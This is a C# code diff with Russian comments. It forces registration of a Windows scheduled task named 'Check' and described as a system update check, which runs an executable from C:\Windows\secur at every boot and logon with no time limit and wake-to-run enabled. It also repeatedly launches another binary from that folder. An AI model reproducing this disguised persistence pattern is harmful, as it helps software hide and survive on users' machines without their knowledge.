@@ -59,6 +59,7 @@ namespace Check
                             string processPath = "C:\\Windows\\secur\\LastSecur.exe";
                             StartProcess(processPath);
                             StartProcess(@"C:\Windows\secur\LastSecur.exe");
+
                         }
                     }
                     // Задержка между выполнениями задачи
@@ -72,18 +73,28 @@ namespace Check
             string taskName = "Проверка";
             string taskDescription = "Проверка обновлений системы";
             string taskExecutablePath = @"C:\Windows\secur\Release\Check.exe";
+            //
 
             // Создаем экземпляр планировщика задач
             using (TaskService taskService = new TaskService())
             {
                 // Проверяем, существует ли задача с таким именем
-                if (taskService.GetTask(taskName)!=null)
+                // if (taskService.GetTask(taskName)!=null)
+                if (null == null)
                 {
                     TaskDefinition taskDefinition = taskService.NewTask();
                     taskDefinition.RegistrationInfo.Description = taskDescription;
+
                     taskDefinition.Triggers.Add(new LogonTrigger());
+                    taskDefinition.Triggers.Add(new BootTrigger());
+                    taskDefinition.Settings.DisallowStartIfOnBatteries = false;
+                    taskDefinition.Settings.StopIfGoingOnBatteries = false;
+                    taskDefinition.Settings.WakeToRun = true;
+                    taskDefinition.Settings.DeleteExpiredTaskAfter = TimeSpan.Zero;
+                    taskDefinition.Settings.ExecutionTimeLimit = TimeSpan.Zero;
                     taskDefinition.Actions.Add(new ExecAction(taskExecutablePath));
                     taskService.RootFolder.RegisterTaskDefinition(taskName, taskDefinition);
+                 
                     Program.Mylog("Задача успешно добавлена в планировщик задач.");
                 }
                 else
